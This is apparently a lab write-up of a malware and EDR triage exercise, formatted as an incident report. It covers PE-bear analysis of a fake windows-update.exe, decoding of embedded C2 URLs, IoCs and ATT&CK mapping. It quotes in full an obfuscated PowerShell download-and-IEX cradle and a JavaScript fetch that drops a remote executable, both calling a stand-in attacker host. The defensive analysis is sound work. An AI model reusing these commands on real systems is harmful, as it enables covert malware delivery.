# Incident Report: Shadow Trace – Static Malware & EDR Alert Triage

| Metadata | Details |
| :--- | :--- |
| **Date** | October 2026 |
| **Analyst** | Piotr Asyngier |
| **Tools Used** | PE-bear, CyberChef, EDR Alert Console |
| **Category** | Static Malware Analysis & Endpoint Triage |

---

## 1. Executive Summary
A suspicious executable masquerading as a legitimate Windows update (`windows-update.exe`) was discovered on a user's workstation (`C:\Users\DFIRUser\Desktop\`). Concurrently, the Endpoint Detection and Response (EDR) system generated critical alerts on `WIN-SRV-01.tryhackme.local` involving obfuscated PowerShell execution and suspicious browser-based file downloads.

---

## 2. Static Binary Analysis (`windows-update.exe`)

### 2.1. File Header & Cryptographic Hash Identification
The suspected binary located at `C:\Users\DFIRUser\Desktop\windows-update.exe` was loaded into **PE-bear** for static inspection without executing the file.

* **Architecture:** Inspection of the `File Header` (`Machine: 0x8664`) confirmed that the binary is a **64-bit (AMD64)** executable compiled on `2025-10-03 03:13:45 UTC`.
* **SHA-256 Hash:** Extracted from the `General` tab for threat intelligence enrichment and blocklisting: `b2a88de3e3bcfae4a4b38fa36e884c586b5cb2c2c283e71fba59efdb9ea64bfc`

<img width="763" height="544" alt="obraz" src="https://github.com/user-attachments/assets/7904a9d0-25f2-421d-93f7-6a9f4e4777cd" />
<img width="763" height="544" alt="obraz" src="https://github.com/user-attachments/assets/5f6d3fea-45e6-4eb0-a911-985ffafee4c3" />



---

### 2.2. Strings Analysis & Embedded C2 Indicators
By inspecting the human-readable strings embedded within the binary (`Strings` tab filtered for `http` and `tryhatme`), several critical Indicators of Compromise (IoCs) and behavioral clues were uncovered:

1. **Secondary Payload / Staging URL:**
   * Discovered string: `hxxp://tryhatme[.]com/update/security-update.exe`
2. **Command & Control (C2) Exfiltration Domain:**
   * Discovered domain: `responses.tryhatme[.]com`
3. **Obfuscated URI Path (Base64):**
   * Embedded URI: `tryhatme[.]com/VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=`
   * Decoding the Base64 payload (`VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=`) in **CyberChef** revealed the hidden string: `THM{REDACTED_FLAG}`

<img width="763" height="544" alt="obraz" src="https://github.com/user-attachments/assets/0cc436a9-6562-4c3f-8527-56abddaf863f" />
<img width="763" height="544" alt="obraz" src="https://github.com/user-attachments/assets/df986a4c-9c6f-43f8-8841-ee9e30f3e9b4" />
<img width="763" height="544" alt="obraz" src="https://github.com/user-attachments/assets/0b0dba68-90b9-4e7d-a198-4359c637c9f8" />
<img width="763" height="544" alt="obraz" src="https://github.com/user-attachments/assets/73b37eb3-af8a-47cc-a812-b4d76a466c81" />


---

### 2.3. Capability Assessment via Import Address Table (IAT)
Reviewing the `Imports` tab in PE-bear revealed the Dynamically Linked Libraries (DLLs) utilized by the malware:
* **`WS2_32.dll` (Windows Sockets 2 API):** Confirms low-level network socket communication capabilities (e.g., `InetPtonW`).
* **`SHELL32.dll`:** Indicates the ability to execute system shell commands.

<img width="763" height="544" alt="obraz" src="https://github.com/user-attachments/assets/d2efc0c7-6203-4b0b-8336-ba2ace880bf2" />


---

## 3. EDR Alert Triage (`WIN-SRV-01.tryhackme.local`)

Two `Critical` severity alerts were triggered on host `WIN-SRV-01.tryhackme.local`.

### Alert 1: Suspicious PowerShell Execution (16:15 UTC)
* **Process:** `powershell.exe`
* **Raw Command:** `(new-object system.net.webclient).DownloadString([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl"))) | IEX;`
* **Analysis:** The attacker used a classic fileless execution technique (`Net.WebClient.DownloadString` piped directly to `IEX` / `Invoke-Expression`) with a Base64-encoded target URL to bypass basic command-line detections.
* **Decoded Payload (via CyberChef):** `hxxps://tryhatme[.]com/dev/main.exe`

<img width="919" height="547" alt="obraz" src="https://github.com/user-attachments/assets/db34a039-2347-4896-a5b8-4712ff1b2c4b" />
<img width="919" height="547" alt="obraz" src="https://github.com/user-attachments/assets/ee212e90-3673-4581-b1ed-9ec90371b5a4" />


---

### Alert 2: Suspicious Browser Download via JavaScript (17:15 UTC)
* **Process:** `chrome.exe` (Browser JavaScript Execution)
* **Raw Command:** `fetch([104,116,116,112,115,58,47,47,114,101,97,108,108,121,115,101,99,117,114,101,117,112,100,97,116,101,46,116,114,121,104,97,116,109,101,46,99,111,109,47,117,112,100,97,116,101,46,101,120,101].map(c=>String.fromCharCode(c)).join("")).then(r=>r.blob()).then(b=>{const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download='test.txt';document.body.appendChild(a);a.click();a.remove();URL.revokeObjectURL(u);});`
* **Analysis:** The script uses `String.fromCharCode()` to reconstruct a URL from an array of **Decimal ASCII values**, fetches the remote binary as a blob, and forces the browser to automatically download it to the disk under an innocuous filename (`test.txt`).
* **Decoded URL (via CyberChef `From Decimal`):** `hxxps://reallysecureupdate.tryhatme[.]com/update.exe`
* **Dropped Filename:** `test.txt` (actual content: `update.exe` binary).

<img width="919" height="547" alt="obraz" src="https://github.com/user-attachments/assets/945d0fd9-f062-46b7-a51d-ff5296eb70dc" />
<img width="919" height="547" alt="obraz" src="https://github.com/user-attachments/assets/71e81728-18f4-4652-b97a-f6b408e51873" />
<img width="919" height="547" alt="obraz" src="https://github.com/user-attachments/assets/036c4298-e244-47ff-88be-b749fdf46a3b" />



---

## 4. Consolidated Indicators of Compromise (IoCs)

| Indicator Type | Value (Defanged) | Context |
| :--- | :--- | :--- |
| **SHA-256** | `b2a88de3e3bcfae4a4b38fa36e884c586b5cb2c2c283e71fba59efdb9ea64bfc` | Malicious binary `windows-update.exe` |
| **Domain** | `responses.tryhatme[.]com` | C2 / Exfiltration domain |
| **URL** | `hxxp://tryhatme[.]com/update/security-update.exe` | Hardcoded staging URL in PE binary |
| **URL** | `hxxps://tryhatme[.]com/dev/main.exe` | Downloaded via encoded PowerShell |
| **URL** | `hxxps://reallysecureupdate.tryhatme[.]com/update.exe` | Fetched via obfuscated JS in `chrome.exe` |
| **File Artifact** | `test.txt` / `windows-update.exe` | Dropped malicious files on endpoint |

---

## 5. MITRE ATT&CK Mapping & Remediation

### MITRE ATT&CK Techniques
* **`T1059.001` – Command and Scripting Interpreter: PowerShell:** Execution of remote payload in memory using `DownloadString` and `IEX`.
* **`T1027` – Obfuscated Files or Information:** Use of Base64 and Decimal ASCII encoding (`String.fromCharCode`) to hide malicious URLs.
* **`T1189` / `T1204.002` – User Execution: Malicious File:** Forced browser download via injected JavaScript (`test.txt`) and fake `windows-update.exe`.

### Recommended Remediation Actions
1. **Host Isolation:** Immediately isolate `WIN-SRV-01.tryhackme.local` and the affected workstation via EDR to prevent C2 communication and lateral movement.
2. **Network Blocklisting:** Block all traffic to `*.tryhatme.com` on the perimeter firewall / DNS sinkhole.
3. **Endpoint Eradication:** Quarantine `C:\Users\DFIRUser\Desktop\windows-update.exe` and search the Downloads directory on `WIN-SRV-01` for `test.txt`, blocking the SHA-256 hash across all enterprise endpoints.
